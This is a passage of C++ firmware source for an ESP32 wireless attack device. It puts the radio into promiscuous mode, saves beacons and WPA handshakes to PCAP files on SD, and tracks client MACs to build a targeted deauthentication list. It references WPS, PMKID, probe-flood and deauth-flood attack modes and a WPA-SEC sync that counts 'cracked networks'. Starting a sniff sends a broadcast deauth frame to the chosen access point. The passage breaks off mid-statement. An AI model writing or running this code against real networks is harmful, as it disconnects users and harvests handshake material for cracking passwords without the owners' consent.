// ---------- Session Telemetry Tracking (for /api/telemetry) ----------
// DISABLED: causes 8-byte DRAM overflow even with minimal tracking
// Android app can use existing /api/status instead

static void telemetry_startSession() {
  // Disabled
}

static void telemetry_recordPacket(int16_t rssi, uint16_t len) {
  // Disabled
}

static void telemetry_saveSnapshot() {
  // Disabled
}
static volatile uint32_t sniffDroppedPackets = 0;
static volatile uint32_t sniffWriteErrors = 0;
static volatile uint32_t monPktMgmt = 0;
static volatile uint32_t monPktCtrl = 0;
static volatile uint32_t monPktData = 0;
static volatile uint32_t monBeaconHits = 0;
static volatile uint32_t monHandshakeHits = 0;
static volatile int monLastRssi = -127;
static volatile uint16_t monLastLen = 0;
static volatile uint8_t monLastType = 0;
static uint32_t fileWriteCountBeacon = 0;
static uint32_t fileWriteCountHandshake = 0;
static uint32_t fileTotalErrors = 0;
static SPIClass sdSpi(HSPI);

static bool mountSdCard(bool verbose) {
  if (sdReady) return true;
  if (!BOARD_HAS_SD) {
    if (verbose) Serial.println("[sd] disabled on this target");
    sdReady = false;
    return false;
  }
  if (nd_usb_msc_sd_app_locked()) {
    if (verbose) Serial.println("[sd] app access locked by USB MSC host");
    sdReady = false;
    return false;
  }

#if defined(ND_TDISPLAY_USE_SDMMC)
  SD.setPins(PIN_SD_SCLK, PIN_SD_MOSI, PIN_SD_MISO);
  sdReady = SD.begin("/sdcard", true /* mode1bit */);
#else
  // Use dedicated VSPI bus for SD so we do not disturb touch/TFT SPI bus.
  sdSpi.begin(PIN_SD_SCLK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
  sdReady = SD.begin(PIN_SD_CS, sdSpi, 20000000U);
#endif

  if (verbose) {
    if (sdReady) {
      uint8_t cardType = SD.cardType();
      uint64_t cardSizeMb = SD.cardSize() / (1024ULL * 1024ULL);
#if defined(ND_TDISPLAY_USE_SDMMC)
      Serial.printf("[sd] mounted (SD_MMC 1-bit): clk=%d cmd=%d d0=%d type=%u size=%lluMB\n",
                    PIN_SD_SCLK, PIN_SD_MOSI, PIN_SD_MISO, (unsigned)cardType, cardSizeMb);
#else
      Serial.printf("[sd] mounted: cs=%d type=%u size=%lluMB\n",
                    PIN_SD_CS, (unsigned)cardType, cardSizeMb);
#endif
    } else {
#if defined(ND_TDISPLAY_USE_SDMMC)
      Serial.printf("[sd] mount failed (SD_MMC 1-bit clk=%d cmd=%d d0=%d).\n",
                    PIN_SD_SCLK, PIN_SD_MOSI, PIN_SD_MISO);
#else
      Serial.printf("[sd] mount failed (cs=%d). Insert card or verify SD pins.\n", PIN_SD_CS);
#endif
    }
  }

  return sdReady;
}

static void sdRetryTick() {
  // Disabled: background SD retries can stall UI responsiveness on some boards.
  // SD mount attempts are done in setup() and when starting sniff.
}

static void initCaptureFiles() {
  if (pcapFilesOpen || captureDir[0] == '\0' || !sdReady) return;
  
  if (!SD.exists(captureDir)) {
    SD.mkdir(captureDir);
  }
  
  // Open PCAP files with headers
  char rawPath[160], beaconPath[160], hsPath[160];
  snprintf(rawPath, sizeof(rawPath), "%s/raw.pcap", captureDir);
  snprintf(beaconPath, sizeof(beaconPath), "%s/beacon.pcap", captureDir);
  snprintf(hsPath, sizeof(hsPath), "%s/handshakes.pcap", captureDir);
  
  // Remove old files if they exist
  if (SD.exists(rawPath)) SD.remove(rawPath);
  if (SD.exists(beaconPath)) SD.remove(beaconPath);
  if (SD.exists(hsPath)) SD.remove(hsPath);
  
  // Create and write PCAP headers
  PcapGlobalHeader hdr;
  
  bool ok = true;

  rawPcapFile = SD.open(rawPath, FILE_WRITE);
  if (rawPcapFile) {
    size_t n = rawPcapFile.write((uint8_t*)&hdr, sizeof(hdr));
    rawPcapFile.close();
    ok = ok && (n == sizeof(hdr));
    Serial.printf("[pcap] created: %s\n", rawPath);
  } else {
    ok = false;
  }
  
  beaconPcapFile = SD.open(beaconPath, FILE_WRITE);
  if (beaconPcapFile) {
    size_t n = beaconPcapFile.write((uint8_t*)&hdr, sizeof(hdr));
    beaconPcapFile.close();
    ok = ok && (n == sizeof(hdr));
    Serial.printf("[pcap] created: %s\n", beaconPath);
  } else {
    ok = false;
  }
  
  handshakePcapFile = SD.open(hsPath, FILE_WRITE);
  if (handshakePcapFile) {
    size_t n = handshakePcapFile.write((uint8_t*)&hdr, sizeof(hdr));
    handshakePcapFile.close();
    ok = ok && (n == sizeof(hdr));
    Serial.printf("[pcap] created: %s\n", hsPath);
  } else {
    ok = false;
  }
  
  pcapFilesOpen = ok;
  if (!pcapFilesOpen) {
    sniffWriteErrors++;
    Serial.println("[pcap] init failed; capture files not fully available.");
  }
}

static bool writePacketToPcapPath(const char* path, const uint8_t* packet, uint32_t len) {
  if (!sdReady || !path || !packet || len == 0) return false;
  File f = SD.open(path, FILE_APPEND);
  if (!f) return false;

  // Write PCAP packet header
  uint64_t nowUs = (uint64_t)esp_timer_get_time();
  uint32_t ts_sec = (uint32_t)(nowUs / 1000000ULL);
  uint32_t ts_usec = (uint32_t)(nowUs % 1000000ULL);
  
  PcapPacketHeader pkt_hdr;
  pkt_hdr.ts_sec = ts_sec;
  pkt_hdr.ts_usec = ts_usec;
  pkt_hdr.incl_len = len;
  pkt_hdr.orig_len = len;
  
  size_t h = f.write((uint8_t*)&pkt_hdr, sizeof(pkt_hdr));
  size_t p = f.write(packet, len);
  f.close();
  return (h == sizeof(pkt_hdr) && p == len);
}

static bool isBeaconFrame(const uint8_t* frame, uint32_t len) {
  if (len < 24) return false;
  // Frame control byte 0: type bits [3:2], subtype bits [7:4]
  const uint8_t fc0 = frame[0];
  const uint8_t type = (uint8_t)((fc0 >> 2) & 0x03);
  const uint8_t subtype = (uint8_t)((fc0 >> 4) & 0x0F);
  return (type == 0 && subtype == 8);  // mgmt + beacon
}

static bool isHandshakeFrame(const uint8_t* frame, uint32_t len) {
  if (len < 32) return false;
  // Scan for EAPOL EtherType 0x888E in the LLC/SNAP header (offset ~30 for non-QoS data frames)
  for (uint32_t i = 24; i + 1 < len; i++) {
    if (frame[i] == 0x88 && frame[i+1] == 0x8e) {
      return true;
    }
  }
  return false;
}

static void push1tHandleBeacon(const uint8_t* frame, uint32_t len); // defined near PUSH1T engine
static void specterHandleEapol(const uint8_t* frame, uint32_t len); // defined near SP3CTER engine
static void specterHandleDataFrame(const uint8_t* frame, uint32_t len); // open-AP intel

static void handleCapturedPacket(uint8_t *buf, uint32_t len) {
  if (!hasTarget || !sniffActive || !buf || len < 24) return;
  
  sniffPacketCount++;

  // JAMMIT client discovery: track STA→AP data frames to build targeted deauth list
  // Frame layout (infrastructure, ToDS=1 FromDS=0): fc0,fc1 | dur | BSSID | SA | DA | seq...
  if (autoMode == AutoMode::JAMMIT && s_jammitBssidCached && len >= 24) {
    uint8_t fc1 = buf[1];
    uint8_t frameType = (buf[0] >> 2) & 0x03;
    uint8_t toDS  =  fc1       & 0x01;  // bit 0
    uint8_t fromDS = (fc1 >> 1) & 0x01; // bit 1
    if (frameType == 2 && toDS == 1 && fromDS == 0) {
      // Addr1 = BSSID (buf+4), Addr2 = SA/client (buf+10)
      if (memcmp(buf + 4, s_jammitTargetBssid, 6) == 0) {
        const uint8_t* clientMac = buf + 10;
        if ((clientMac[0] & 0x01) == 0) {  // skip multicast/broadcast
          bool found = false;
          portENTER_CRITICAL_ISR(&jammitClientMux);
          for (uint8_t i = 0; i < jammitClientCount && !found; i++)
            if (memcmp(jammitClientMacs[i], clientMac, 6) == 0) found = true;
          if (!found && jammitClientCount < JAMMIT_MAX_CLIENTS)
            memcpy(jammitClientMacs[jammitClientCount++], clientMac, 6);
          portEXIT_CRITICAL_ISR(&jammitClientMux);
        }
      }
    }
  }
  
  // PUSH1T: parse WPS IEs from beacons for the current target
  if (autoMode == AutoMode::PUSH1T && isBeaconFrame(buf, len)) {
    push1tHandleBeacon(buf, len);
  }

  // SP3CTER: full EAPOL classification, PMKID extraction, client discovery
  if (autoMode == AutoMode::SP3CTER) {
    if (isHandshakeFrame(buf, len)) {
      specterHandleEapol(buf, len);
    } else {
      // Open-AP passive intel (data frames, client tracking)
      const uint8_t fc0 = buf[0];
      if (((fc0 >> 2) & 0x03) == 2) {  // data frame
        specterHandleDataFrame(buf, len);
      }
    }
  }

  // Only write handshake and beacon frames (not all raw packets)
  // Writing ALL packets causes WiFi tx buffer exhaustion and watchdog timeout
  if (pcapCaptureActive && pcapFilesOpen && sdReady) {
    // Check if beacon FIRST (faster check, avoids EAPOL check for most beacons)
    bool isBeacon = isBeaconFrame(buf, len);
    if (isBeacon) {
      monBeaconHits++;
      char beaconPath[160];
      snprintf(beaconPath, sizeof(beaconPath), "%s/beacon.pcap", captureDir);
      if (!writePacketToPcapPath(beaconPath, buf, len)) {
        sniffWriteErrors++;
        fileTotalErrors++;
      } else {
        fileWriteCountBeacon++;
      }
    }
    
    // Check if handshake (EAPOL - more expensive check)
    bool isHandshake = isHandshakeFrame(buf, len);
    if (isHandshake) {
      monHandshakeHits++;
      capturedHandshakes++;  // visible on home screen + API
      char hsPath[160];
      snprintf(hsPath, sizeof(hsPath), "%s/handshakes.pcap", captureDir);
      if (!writePacketToPcapPath(hsPath, buf, len)) {
        sniffWriteErrors++;
        fileTotalErrors++;
      } else {
        fileWriteCountHandshake++;
      }
    }
  }
}

// Promiscuous packet callback
static void IRAM_ATTR promiscuousPacketCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf) {
    sniffDroppedPackets++;
    return;
  }
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_CTRL && type != WIFI_PKT_DATA) {
    sniffDroppedPackets++;
    return;
  }
  wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = ppkt->payload;
  uint32_t len = ppkt->rx_ctrl.sig_len;
  monLastRssi = ppkt->rx_ctrl.rssi;
  monLastLen = (uint16_t)len;
  monLastType = (uint8_t)type;
  if (type == WIFI_PKT_MGMT) monPktMgmt++;
  else if (type == WIFI_PKT_CTRL) monPktCtrl++;
  else if (type == WIFI_PKT_DATA) monPktData++;
  if (!payload || len == 0) {
    sniffDroppedPackets++;
    return;
  }

  // Record telemetry: BSSID is at offset +16 (addr3)
  if (len >= 24) {
    const uint8_t* bssid = payload + 16;
    telemetry_recordPacket(ppkt->rx_ctrl.rssi, len);
  }

  // Capture packet telemetry ring for /api/packets endpoint.
  if (len >= 24) {
    uint8_t fc0 = payload[0];
    uint8_t subtype = (uint8_t)((fc0 >> 4) & 0x0F);
    portENTER_CRITICAL_ISR(&packetRingMux);
    uint16_t idx = packetHead;
    packetRing[idx].seq = ++packetSeq;
    packetRing[idx].ms = (uint32_t)millis();
    packetRing[idx].rssi = ppkt->rx_ctrl.rssi;
    packetRing[idx].len = (uint16_t)len;
    packetRing[idx].type = (uint8_t)type;
    packetRing[idx].subtype = subtype;
    packetRing[idx].channel = ppkt->rx_ctrl.channel;
    memcpy(packetRing[idx].addr1, payload + 4, 6);
    memcpy(packetRing[idx].addr2, payload + 10, 6);
    memcpy(packetRing[idx].addr3, payload + 16, 6);
    packetHead = (uint16_t)((packetHead + 1) % PACKET_RING_SIZE);
    portEXIT_CRITICAL_ISR(&packetRingMux);
  }

  // Feed Recon Deauth Hunter parser from the shared global callback.
  DeauthHunter::ingestPromiscuousPacket(ppkt, type);
  handleCapturedPacket(payload, len);
}

// ---------- Target / Sniff State (Milestone D) ----------

static ApRecord target{};
static bool lockChannel = false;

static uint32_t sniffStartMs = 0;
static uint32_t sniffLastSampleMs = 0;
static uint32_t sniffLastSampleCount = 0;
static int sniffPps = 0;


static void applyChannelLockIfNeeded() {
  if (!hasTarget) return;
  if (!lockChannel) return;
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  return;
#endif
  // Lock radio to the target channel (STA mode). This is passive monitoring.
  esp_wifi_set_channel((uint8_t)target.channel, WIFI_SECOND_CHAN_NONE);
}

static void startSniff() {
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  neon_rf_set_last_action("startSniff");
  neon_rf_log_unsupported("startSniff");
  return;
#endif
  if (!hasTarget) return;
  if (!sdReady) mountSdCard(true);

  applyChannelLockIfNeeded();

  sniffPacketCount = 0;
  sniffStartMs = millis();
  sniffLastSampleMs = sniffStartMs;
  sniffLastSampleCount = 0;
  sniffPps = 0;
  sniffDroppedPackets = 0;
  sniffWriteErrors = 0;
  monPktMgmt = 0;
  monPktCtrl = 0;
  monPktData = 0;
  monBeaconHits = 0;
  monHandshakeHits = 0;
  monLastRssi = -127;
  monLastLen = 0;
  monLastType = 0;

  // Reset telemetry for this session
  telemetry_startSession();

  sniffActive = true;
  pcapCaptureActive = rawCaptureActive;

  // Initialize capture directory: /captures/{SSID}_{BSSID}/
  const char* capturesBaseDir = "/captures";
  
  // Create base captures directory
  if (sdReady && !SD.exists(capturesBaseDir)) {
    SD.mkdir(capturesBaseDir);
  }
  
  // Create target-specific directory: sanitize SSID and use BSSID
  char sanitizedSsid[33];
  memset(sanitizedSsid, 0, sizeof(sanitizedSsid));
  
  if (target.ssid.length() == 0 || target.ssid == "(hidden)") {
    strcpy(sanitizedSsid, "HIDDEN");
  } else {
    for (int i = 0; i < target.ssid.length() && i < 32; i++) {
      char c = target.ssid[i];
      if (isalnum(c) || c == '-' || c == '_') {
        sanitizedSsid[i] = c;
      } else {
        sanitizedSsid[i] = '_';
      }
    }
  }
  
  char bssidSafe[32];
  memset(bssidSafe, 0, sizeof(bssidSafe));
  size_t bssidLen = target.bssid.length();
  for (size_t i = 0; i < bssidLen && i < sizeof(bssidSafe) - 1; i++) {
    char c = target.bssid[i];
    bssidSafe[i] = (c == ':') ? '-' : c;
  }

  snprintf(captureDir, sizeof(captureDir), "%s/%s_%s",
           capturesBaseDir, sanitizedSsid, bssidSafe);
  
  if (sdReady && !SD.exists(captureDir)) {
    SD.mkdir(captureDir);
  }
  
  if (sdReady) {
    initCaptureFiles();
  } else {
    Serial.println("[pcap] SD unavailable; will capture stats only until SD mounts.");
  }
  
  Serial.printf("[sniff] initialized: %s\n", captureDir);

  // ========== CLEAN Wi‑Fi SETUP USING ARDUINO ==========
  // Ensure we are not in promiscuous mode and stop any existing AP
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);                     // Pure AP mode
  delay(100);

  // Start a hidden AP on the target channel
  Serial.printf("[sniff] Starting AP 'dummy' on channel %d (hidden)\n", target.channel);
  bool apStarted = WiFi.softAP("dummy", NULL, target.channel, 1); // 1 = hidden
  if (!apStarted) {
    Serial.println("[sniff] ERROR: Failed to start AP! Deauth will not work.");
    // Fallback: try with different SSID
    apStarted = WiFi.softAP("dummy", NULL, target.channel, 1);
  }
  delay(200); // Give the AP time to fully initialise

  // Print status
  Serial.printf("[sniff] WiFi mode: %d (AP=2)\n", WiFi.getMode());
  Serial.printf("[sniff] AP channel: %d, target channel: %d\n", WiFi.channel(), target.channel);

  // ========== ENABLE PROMISCUOUS MODE ==========
  // Now enable promiscuous mode (this is safe while AP is running)
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuousPacketCallback);
  Serial.println("[sniff] Promiscuous mode enabled.");

  // ========== TEST: Send one broadcast deauth ==========
  uint8_t testBssid[6];
  uint8_t testBroadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  if (macFromString(target.bssid.c_str(), testBssid)) {
    Serial.println("[sniff] Sending test deauth frame...");
    sendDeauthFrame(testBssid, testBroadcast, 7);
  } else {
    Serial.println("[sniff] Failed to parse BSSID for test.");
  }

  Serial.printf("[monitor] start: ssid='%s' bssid=%s ch=%d\n",
                target.ssid.c_str(), target.bssid.c_str(), target.channel);
  uiMemLog("after_start_sniff");
}

// ---------- Automate Modes (Milestone D v8.1) ----------
// Note: AutoMode enum + autoMode variable are declared earlier (before handleCapturedPacket).
static bool verboseSerial = false;

// RAW capture logging (safe: periodic snapshots to LittleFS)
static uint32_t rawLastLogMs = 0;
static const char* RAW_LOG_PATH = "/raw_capture.csv";

static const char* autoModeStr(AutoMode m) {
  switch (m) {
    case AutoMode::Y0INK:   return "Y0INK";
    case AutoMode::SP3CTER: return "SP3CTER";
    case AutoMode::SCOPE: return "SCOPE";
    case AutoMode::JAMMIT: return "JAMMIT";
    case AutoMode::PROBE_FLOOD: return "PROBE";
    case AutoMode::DEAUTH_FLOOD: return "DEAUTH_FLOOD";
    case AutoMode::PUSH1T:       return "PUSH1T";
    default:              return "NONE";
  }
}

static void rawLogHeaderIfNeeded() {
  if (!LittleFS.exists(RAW_LOG_PATH)) {
    File f = LittleFS.open(RAW_LOG_PATH, "w");
    if (f) {
      f.println("ms,ssid,bssid,ch,rssi,pps,pkts,lock,mode");
      f.close();
      Serial.println("[raw] created /raw_capture.csv");
    } else {
      Serial.println("[raw] failed to create /raw_capture.csv");
    }
  }
}

static void rawCaptureTick() {
  if (!rawCaptureActive) return;
  if (!hasTarget) return;

  uint32_t now = millis();
  if (now - rawLastLogMs < 1000) return; // 1 Hz log
  rawLastLogMs = now;

  // Log to SD if available
  if (sdReady && captureDir[0] != '\0') {
    char statsPath[160];
    snprintf(statsPath, sizeof(statsPath), "%s/stats.csv", captureDir);
    
    // Create header if file doesn't exist
    if (!SD.exists(statsPath)) {
      File f = SD.open(statsPath, FILE_WRITE);
      if (f) {
        f.println("ms,ssid,bssid,ch,rssi,pps,pkts,lock,mode");
        f.close();
      }
    }
    
    File f = SD.open(statsPath, FILE_APPEND);
    if (f) {
      f.print(now);
      f.print(",\"");
      f.print(target.ssid);
      f.print("\",");
      f.print(target.bssid);
      f.print(",");
      f.print(target.channel);
      f.print(",");
      f.print(target.rssi);
      f.print(",");
      f.print(sniffPps);
      f.print(",");
      f.print((unsigned long)sniffPacketCount);
      f.print(",");
      f.print(lockChannel ? "1" : "0");
      f.print(",");
      f.println(autoModeStr(autoMode));
      f.close();
    }
  } else {
    // Fallback to LittleFS if SD not available
    rawLogHeaderIfNeeded();
    File f = LittleFS.open(RAW_LOG_PATH, "a");
    if (f) {
      f.print(now);
      f.print(",");
      f.print("\""); f.print(target.ssid); f.print("\"");
      f.print(",");
      f.print(target.bssid);
      f.print(",");
      f.print(target.channel);
      f.print(",");
      f.print(target.rssi);
      f.print(",");
      f.print(sniffPps);
      f.print(",");
      f.print((unsigned long)sniffPacketCount);
      f.print(",");
      f.print(lockChannel ? "1" : "0");
      f.print(",");
      f.println(autoModeStr(autoMode));
      f.close();
    }
  }
}


static void stopSniff() {
  // Reset state flags
  sniffActive = false;
  sniffPps = 0;
  rawCaptureActive = false;
  pcapCaptureActive = false;
  captureMode = CaptureMode::NONE;   // also reset capture mode
  autoMode = AutoMode::NONE;

#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  // startSniff() is a no-op on these targets; no local radio state to teardown.
  Serial.println("[sniff] stopSniff: no-op (RF not supported on this target)");
  return;
#endif

  // Disable promiscuous mode and tear down AP gracefully (use mutex)
  if (wifiOpMutex) {
    if (xSemaphoreTake(wifiOpMutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
      // Retry disabling promiscuous in case driver is busy
      const int PROM_MAX_ATTEMPTS_STOP = 6;
      int promBackoff = 10;
      for (int attempt = 0; attempt < PROM_MAX_ATTEMPTS_STOP; attempt++) {
        esp_err_t er = esp_wifi_set_promiscuous(false);
        if (er == ESP_OK) break;
        Serial.printf("[wifi] esp_wifi_set_promiscuous(false) failed=%d attempt=%d\n", er, attempt);
        delay(promBackoff);
        promBackoff *= 2;
      }

      delay(20);
      // Stop the AP (if any)
      WiFi.softAPdisconnect(true);
      delay(20);
      // Return to STA mode (so scanning works normally)
      WiFi.mode(WIFI_STA);
      delay(20);

      xSemaphoreGive(wifiOpMutex);
    } else {
      Serial.println("[wifi] stopSniff: wifiOpMutex timeout");
    }
  } else {
    // Fallback if mutex not used
    esp_wifi_set_promiscuous(false);
    delay(20);
    WiFi.softAPdisconnect(true);
    delay(20);
    WiFi.mode(WIFI_STA);
    delay(20);
  }

  // Log summary if capturing was active
  if (pcapFilesOpen && captureDir[0] != '\0' && sdReady) {
    char summaryPath[160];
    snprintf(summaryPath, sizeof(summaryPath), "%s/capture_summary.txt", captureDir);

    File f = SD.open(summaryPath, FILE_WRITE);
    if (f) {
      f.printf("Capture Summary\n");
      f.printf("SSID: %s\n", target.ssid.c_str());
      f.printf("BSSID: %s\n", target.bssid.c_str());
      f.printf("Channel: %d\n", target.channel);
      f.printf("Total packets captured: %lu\n", sniffPacketCount);
      f.printf("Dropped packets: %lu\n", sniffDroppedPackets);
      f.printf("PCAP write errors: %lu\n", sniffWriteErrors);
      f.printf("Capture duration: %d seconds\n", (millis() - sniffStartMs) / 1000);
      f.printf("Output files:\n");
      f.printf("  - raw.pcap (all packets)\n");
      f.printf("  - beacon.pcap (beacon frames)\n");
      f.printf("  - handshakes.pcap (EAPOL/handshake frames)\n");
      f.printf("  - stats.csv (periodic statistics)\n");
      f.close();

      Serial.printf("[sniff] capture summary: %s\n", summaryPath);
    }
  }

  // Close PCAP files and reset directory
  if (rawPcapFile) rawPcapFile.close();
  if (beaconPcapFile) beaconPcapFile.close();
  if (handshakePcapFile) handshakePcapFile.close();
  pcapFilesOpen = false;
  captureDir[0] = '\0';

  Serial.println("[monitor] stop");
  uiMemLog("after_stop_sniff");
}

static void updateSniffStats() {
  if (!sniffActive) return;
applyChannelLockIfNeeded();

  uint32_t now = millis();
  if (now - sniffLastSampleMs >= 500) {
    uint32_t c = sniffPacketCount;
    uint32_t dc = c - sniffLastSampleCount;
    uint32_t dt = now - sniffLastSampleMs;
    if (dt == 0) dt = 1;
    sniffPps = (int)((dc * 1000UL) / dt);

    sniffLastSampleMs = now;
    sniffLastSampleCount = c;
  }
}



ApRecord aps[MAX_APS];
int apCount = 0;
int apScroll = 0;
int apSelected = -1;
bool wifiIsScanning = false;
static bool wifiPrimedByIndex[MAX_APS] = {};
static String wifiPrimedBssids[MAX_APS];
static int wifiPrimedCount = 0;
static float wifiRadarSweepDeg = 0.0f;
static uint32_t wifiRadarLastMs = 0;

// Confirm-before-target (Milestone D v3)
static bool wifiConfirmActive = false;
static ApRecord pendingTarget{};

static const char* authToStr(wifi_auth_mode_t a) {
  switch (a) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
#if defined(WIFI_AUTH_WPA3_PSK)
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
#endif
#if defined(WIFI_AUTH_WPA2_WPA3_PSK)
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
#endif
    default: return "SEC?";
  }
}

static void wifiRefreshPrimedCount() {
  wifiPrimedCount = 0;
  for (int i = 0; i < apCount; i++) if (wifiPrimedByIndex[i]) wifiPrimedCount++;
}

static void wifiSnapshotPrimedByBssid() {
  for (int i = 0; i < MAX_APS; i++) wifiPrimedBssids[i] = "";
  int w = 0;
  for (int i = 0; i < apCount && w < MAX_APS; i++) {
    if (!wifiPrimedByIndex[i]) continue;
    wifiPrimedBssids[w++] = aps[i].bssid;
  }
}

static void wifiRestorePrimedByBssid() {
  for (int i = 0; i < MAX_APS; i++) wifiPrimedByIndex[i] = false;
  for (int i = 0; i < apCount; i++) {
    for (int j = 0; j < MAX_APS; j++) {
      if (wifiPrimedBssids[j].isEmpty()) continue;
      if (aps[i].bssid.equalsIgnoreCase(wifiPrimedBssids[j])) {
        wifiPrimedByIndex[i] = true;
        break;
      }
    }
  }
  wifiRefreshPrimedCount();
}

static void wifiTogglePrimedIndex(int idx) {
  if (idx < 0 || idx >= apCount) return;
  wifiPrimedByIndex[idx] = !wifiPrimedByIndex[idx];
  if (wifiPrimedByIndex[idx]) {
    hasTarget = true;
    target = aps[idx];  // Last checked wins for current TARGET screen compatibility.
  } else if (wifiPrimedCount <= 1) {
    bool any = false;
    for (int i = 0; i < apCount; i++) {
      if (!wifiPrimedByIndex[i]) continue;
      target = aps[i];
      hasTarget = true;
      any = true;
      break;
    }
    if (!any) hasTarget = false;
  }
  wifiRefreshPrimedCount();
}

// Scanning helpers are implemented in src/wifiscan.cpp
// Declarations in src/wifiscan.h
// use doWifiScanBlocking(), sortApsByRssiDesc(), dedupeKeepStrongest(), bssidEquals()

// ---------- WiFi Connect State (User connection to AP) ----------
static String wifiConnectSsid;          // Currently selected SSID
static String wifiConnectPassword;      // Password being entered (plain text)
static bool wifiConnectNeedsPassword = false;  // Whether the selected AP requires a password
static bool wifiConnectInProgress = false;  // True while attempting connection
static String wifiConnectStatus;        // Status message for user
static uint32_t wifiConnectAttemptMs = 0;  // Timestamp of last connection attempt
static bool wifiConnectScanActive = false; // True while async scan is in flight
static uint32_t wifiConnectScanStartedMs = 0;
static int wifiConnectSelectedIdx = -1; // Index of selected AP in aps[] array
static int wifiConnectScroll = 0;       // Scroll position for AP list
static bool wifiConnectShowPasswordModal = false;  // Show password input modal
static bool wifiConnectShowSavedDrawer = false;
static bool wifiConnectRevealPassword = false;
static int wifiConnectStatusY = -1;
static constexpr int WIFI_CONNECT_VISIBLE_ROWS = 4;
static bool webServerRunning = false;   // Is the HTTP OTA server running?
static uint16_t webServerPort = 8080;   // WebServer port
static WebServer webServer(webServerPort);  // WebServer for OTA updates
static const char* androidApkPath = "/CYDCompanion.apk";
static const char* wpasecResultsPath = "/wpasec_results.txt";
static const char* wpasecUploadedPath = "/wpasec_uploaded.txt";
static File androidApkUploadFile;
static bool sdUploadOk = false;
static String apSsid = "CYD_COMPANION";  // AP SSID when in AP mode
static String apPassword = "";          // AP password (empty = open)
static bool apMode = false;             // True when in AP mode
static bool wpasecSyncInProgress = false;  // WPA-SEC sync status
static String wpasecSyncStatus = "";   // WPA-SEC sync message
static uint16_t crackedNetworks = 0;    // Number of cracked networks
// Android Companion -> CYD visual indicator (shows during SD pulls)
static uint32_t companionSyncUntilMs = 0;
static bool companionSyncBadgeWasDrawn = false;
// USB serial RPC file transfer session (phone app over OTG cable)
static String usbDlToken = "";
static String usbDlPath = "";
static size_t usbDlSize = 0;

enum class RiskyWebAction : uint8_t {
  NONE = 0,
  START_SNIFF,
  AUTO_Y0INK,
  AUTO_RAW,
  AUTO_SCOPE,
  AUTO_JAMMIT
};
static bool confirmWebRiskAction(RiskyWebAction action, const char* actionLabel);

static RiskyWebAction pendingRiskyWebAction = RiskyWebAction::NONE;
static uint32_t pendingRiskyWebActionMs = 0;

// ---------- UI ----------
enum class ScreenId : uint8_t {
  HOME,
  JUST_GO,
  WIFI_SCAN,
  CONFIRM_TARGET,
  TARGET_DETAILS,
  AUTOMATE_MENU,
  MONITOR,
  RECON,
  TARGETS_PLACEHOLDER,
  CONFIG,
  WIFI_CONFIG,
  STARTUP_CONFIG,
  TELEMETRY_CONFIG,
  WIFI_CONNECT,
  WEBSERVER,
  ABOUT,
  PACKETLAB_MENU,
  PACKETLAB_MONITOR,
  PACKETLAB_SET_TARGET,
  SCOPE_GRAPH,
  LED_CONTROL,
  NEON_PANIC,
  PORT_SCANNER,
  RECON_HOME,
  WARDRIVE,
  SYNC,
  PUSH1T_SCREEN,
  SP3CTER_SCREEN,
};
static ScreenId screen = ScreenId::HOME;

static const char* screenToStr(ScreenId s) {
  switch (s) {
    case ScreenId::HOME: return "HOME";
    case ScreenId::JUST_GO: return "JUST_GO";
    case ScreenId::WIFI_SCAN: return "WIFI_SCAN";
    case ScreenId::CONFIRM_TARGET: return "CONFIRM_TARGET";
    case ScreenId::TARGET_DETAILS: return "TARGET_DETAILS";
    case ScreenId::AUTOMATE_MENU: return "AUTOMATE_MENU";
    case ScreenId::MONITOR: return "MONITOR";
    case ScreenId::TARGETS_PLACEHOLDER: return "TARGETS_PLACEHOLDER";
    case ScreenId::CONFIG: return "CONFIG";
    case ScreenId::WIFI_CONFIG: return "WIFI_CONFIG";
    case ScreenId::STARTUP_CONFIG: return "STARTUP_CONFIG";
    case ScreenId::TELEMETRY_CONFIG: return "TELEMETRY_CONFIG";
    case ScreenId::WIFI_CONNECT: return "WIFI_CONNECT";
    case ScreenId::WEBSERVER: return "WEBSERVER";
    case ScreenId::RECON: return "RECON";
    case ScreenId::ABOUT: return "ABOUT";
    case ScreenId::PACKETLAB_MENU: return "PACKETLAB_MENU";
    case ScreenId::PACKETLAB_MONITOR: return "PACKETLAB_MONITOR";
    case ScreenId::PACKETLAB_SET_TARGET: return "PACKETLAB_SET_TARGET";
    case ScreenId::SCOPE_GRAPH: return "SCOPE_GRAPH";
    case ScreenId::LED_CONTROL: return "LED_CONTROL";
    case ScreenId::NEON_PANIC: return "NEON_PANIC";
    case ScreenId::PORT_SCANNER: return "PORT_SCANNER";
    case ScreenId::RECON_HOME:   return "RECON_HOME";
    case ScreenId::WARDRIVE:     return "WARDRIVE";
    case ScreenId::SYNC:          return "SYNC";
    case ScreenId::PUSH1T_SCREEN: return "PUSH1T";
    case ScreenId::SP3CTER_SCREEN: return "SP3CTER";
    default: return "UNKNOWN";
  }
}

static void printRuntimeStatus() {
  Serial.printf(
    "[hb] screen=%s wifiScan=%d aps=%d sel=%d scroll=%d target=%d ssid='%s' ch=%d "
    "sniff=%d mode=%s lock=%d pps=%d pkts=%lu drop=%lu werr=%lu sd=%d msc=%d host=%d sd_lock=%d dirty=%d\n",
    screenToStr(screen),
    wifiIsScanning ? 1 : 0,
    apCount, apSelected, apScroll,
    hasTarget ? 1 : 0,
